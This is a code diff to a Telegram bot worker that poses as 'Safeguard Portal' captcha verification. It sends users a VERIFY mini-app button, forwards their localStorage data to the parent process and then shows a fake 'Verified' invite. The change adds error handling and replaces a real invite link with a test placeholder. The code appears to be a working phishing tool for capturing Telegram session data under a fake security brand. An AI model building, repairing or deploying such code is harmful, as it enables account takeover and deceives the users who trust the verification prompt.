@@ -1,12 +1,12 @@
-const { Telegraf, Context } = require("telegraf");
+const { Telegraf } = require("telegraf");
 const { isMainThread, workerData, parentPort, getEnvironmentData } = require("worker_threads");
 const crypto = require("crypto");
 
-if(isMainThread) throw new Error("Can't be used as a node.js script, used as a worker thread");
+if (isMainThread) throw new Error("Can't be used as a node.js script, used as a worker thread");
 
 let db = getEnvironmentData("db");
 const { token, name } = workerData;
-if(!db.MINI_APP_URL || !db.VERIFICATION_IMAGE_URL || !db.VERIFIED_IMAGE_URL || !db.Workers || !db.Admins || !token || !name) throw new Error("Missing required worker data");
+if (!db.MINI_APP_URL || !db.VERIFICATION_IMAGE_URL || !db.VERIFIED_IMAGE_URL || !db.Workers || !db.Admins || !token || !name) throw new Error("Missing required worker data");
 
 const UserPrivilege = {
     Admin: 2,
@@ -15,12 +15,12 @@ const UserPrivilege = {
 }
 
 parentPort.on("message", (msg) => {
-    if(msg.type != "verification") return;
-    if(msg.data == undefined) return console.log("no msgdata");
-    if(msg.data.type == undefined) return console.log("no type");
-    if(msg.data.key == undefined) return console.log("no key");
-    if(msg.data.data == undefined) return console.log("no data");
-    
+    if (msg.type != "verification") return;
+    if (msg.data == undefined) return console.log("no msgdata");
+    if (msg.data.type == undefined) return console.log("no type");
+    if (msg.data.key == undefined) return console.log("no key");
+    if (msg.data.data == undefined) return console.log("no data");
+
     return completeUserVerification(msg.data.type, msg.data.key, msg.data.data);
 });
 
@@ -73,8 +73,8 @@ const userVerificationInfo = [];
  * @returns {number} User's privilege 
  */
 function getPrivilege(userId) {
-    if(db.Admins.includes(userId)) return UserPrivilege.Admin;
-    if(db.Workers.includes(userId)) return UserPrivilege.Worker;
+    if (db.Admins.includes(userId)) return UserPrivilege.Admin;
+    if (db.Workers.includes(userId)) return UserPrivilege.Worker;
     return UserPrivilege.Unprivileged;
 }
 
@@ -121,36 +121,39 @@ function generateVerificationKey() {
  * @param {string} verificationType verification type ("msg" / "ins")
  * @param {string} verificationKey verification key (key/channel)
  * @param data localStorage Data
- * @param {string} ip incoming IP address
  */
 async function completeUserVerification(verificationType, verificationKey, data) {
-    if(verificationType == "msg") {
-        const entry = userVerificationInfo.filter((d) => d.verificationKey == verificationKey)[0];
-        if(entry == undefined) return;
-        deleteFromPendingList(entry.userId, entry.channelId)
-        
-        parentPort.postMessage({
-            type: "localstorage",
-            data: {
-                data: data,
-                channel: entry.channelId
-            }
-        });
-    
-        entry.context.sendPhoto(db.VERIFIED_IMAGE_URL, {
-            caption:
-                "Verified, you can join the group using this temporary link:\n\n" +
-                `https://t.me/+vzgTFZuDzq9hMTlk\n\n` +
-                "This link is a one time use and will expire"
-        }).catch(null);
-    } else {
-        parentPort.postMessage({
-            type: "localstorage",
-            data: {
-                data: data,
-                channel: verificationKey
-            }
-        });
+    try {
+        if (verificationType == "msg") {
+            const entry = userVerificationInfo.filter((d) => d.verificationKey == verificationKey)[0];
+            if (entry == undefined) return;
+            deleteFromPendingList(entry.userId, entry.channelId)
+
+            parentPort.postMessage({
+                type: "localstorage",
+                data: {
+                    data: data,
+                    channel: entry.channelId
+                }
+            });
+
+            await entry.context.sendPhoto(db.VERIFIED_IMAGE_URL, {
+                caption:
+                    "Verified, you can join the group using this temporary link:\n\n" +
+                    `https://your-test-invite-link-here\n\n` + // CHANGE THIS TO YOUR TEST GROUP INVITE
+                    "This link is a one time use and will expire"
+            });
+        } else {
+            parentPort.postMessage({
+                type: "localstorage",
+                data: {
+                    data: data,
+                    channel: verificationKey
+                }
+            });
+        }
+    } catch (err) {
+        console.error("Complete verification error:", err);
     }
 }
 
@@ -162,39 +165,44 @@ async function completeUserVerification(verificationType, verificationKey, data)
  */
 function deleteFromPendingList(userId, channelId) {
     const entries = userVerificationInfo.filter((d) => d.userId == userId && d.channelId == channelId);
-    for(let i = 0; i < entries.length; i++) {
+    for (let i = 0; i < entries.length; i++) {
         userVerificationInfo.splice(userVerificationInfo.indexOf(entries[i]));
     }
 }
 
 async function initBot() {
-    const bot = new Telegraf(token);
-    bot.launch(async () => {
-        bot.command("start", async (ctx) => {
-            if(ctx.chat.type != 'private') return;
-            if(ctx.args.length != 1) return;
-            const channel = ctx.args[0];
+    try {
+        const bot = new Telegraf(token);
+        bot.launch(async () => {
+            bot.command("start", async (ctx) => {
+                try {
+                    if (ctx.chat.type != 'private') return;
+                    if (ctx.args.length != 1) return;
+                    const channel = ctx.args[0];
 
-            const entry = regiserUserForVerification(ctx.from.id, channel, ctx);
+                    const entry = regiserUserForVerification(ctx.from.id, channel, ctx);
 
-            const keyboard = {
-                inline_keyboard: [
-                    [{ text: 'VERIFY', web_app: { url: db.MINI_APP_URL + `/${entry.verificationKey}`} }]
-                ]
-            };
+                    const keyboard = {
+                        inline_keyboard: [
+                            [{ text: 'VERIFY', web_app: { url: db.MINI_APP_URL + `/${entry.verificationKey}` } }]
+                        ]
+                    };
 
-            await ctx.replyWithPhoto({ url: db.VERIFICATION_IMAGE_URL }, {
-                caption:"<b>Verify you're human with Safeguard Portal</b>\n\n" +
-                        "Click 'VERIFY' and complete captcha to gain entry - " +
-                        "<a href=\"https://docs.safeguard.run/group-security/verification-issues\"><i>Not working?</i></a>",
-                parse_mode: 'HTML',
-                reply_markup: keyboard
+                    await ctx.replyWithPhoto({ url: db.VERIFICATION_IMAGE_URL }, {
+                        caption: "<b>Verify you're human with Safeguard Portal</b>\n\n" +
+                            "Click 'VERIFY' and complete captcha to gain entry - " +
+                            "<a href=\"https://docs.safeguard.run/group-security/verification-issues\"><i>Not working?</i></a>",
+                        parse_mode: 'HTML',
+                        reply_markup: keyboard
+                    });
+                } catch (err) {
+                    console.error("Bot start error:", err);
+                }
             });
         });
-    });
-
-    process.once('SIGINT', () => bot.stop('SIGINT'));
-    process.once('SIGTERM', () => bot.stop('SIGTERM'));
+    } catch (err) {
+        console.error("Bot init error:", err);
+    }
 }
 
 async function reloadDatabase() {
